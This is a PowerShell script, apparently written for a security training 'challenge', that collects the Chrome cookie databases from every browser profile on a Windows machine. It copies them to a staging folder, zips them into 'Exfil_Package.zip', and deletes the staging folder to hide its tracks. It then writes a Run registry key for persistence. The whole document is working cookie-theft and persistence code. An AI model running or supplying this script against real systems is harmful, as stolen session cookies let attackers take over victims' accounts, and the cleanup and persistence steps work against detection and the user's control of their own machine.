# 1. SETUP: Define paths
$chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data"
$stagingArea = "$env:USERPROFILE\Desktop\Staged_Data"
$zipReport = "$env:USERPROFILE\Desktop\Exfil_Package.zip"
$flagFile = "$env:USERPROFILE\Desktop\CHALLENGE_FLAG.txt"

# 2. PREPARATION: Create a hidden staging folder
if (Test-Path $stagingArea) { Remove-Item -Path $stagingArea -Recurse -Force }
New-Item -ItemType Directory -Path $stagingArea -Force | Out-Null

# 3. DISCOVERY: Find all Profile folders that contain a Cookie database
# We look for folders like 'Default', 'Profile 1', 'Profile 2', etc.
$profiles = Get-ChildItem -Path $chromePath -Directory | Where-Object { Test-Path (Join-Path $_.FullName "Network\Cookies") }

foreach ($p in $profiles) {
    $sourceCookie = Join-Path $p.FullName "Network\Cookies"
    $destName = "Cookies_" + $p.Name
    $destPath = Join-Path $stagingArea $destName
    
    # Copy the file (using -Force because Chrome might be open and 'locking' the file)
    Copy-Item -Path $sourceCookie -Destination $destPath -Force
}

# 4. PACKAGING: Zip the stolen data into one file
if ((Get-ChildItem $stagingArea).Count -gt 0) {
    Compress-Archive -Path "$stagingArea\*" -DestinationPath $zipReport -Force
    "Timestamp: $(Get-Date) - SUCCESS: $($profiles.Count) Profiles harvested into Exfil_Package.zip" | Out-File -FilePath $flagFile -Append
} else {
    "Timestamp: $(Get-Date) - FAILURE: No Chrome profiles identified." | Out-File -FilePath $flagFile -Append
}

# 5. CLEANUP: Delete the unzipped staging folder to hide tracks
Remove-Item -Path $stagingArea -Recurse -Force

# 6. PERSISTENCE: (Your original challenge logic)
$trigger = "msg * 'Security Alert: Unauthorized Data Access Simulated. Check your Desktop!'"
Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OnboardingChallenge' -Value $trigger
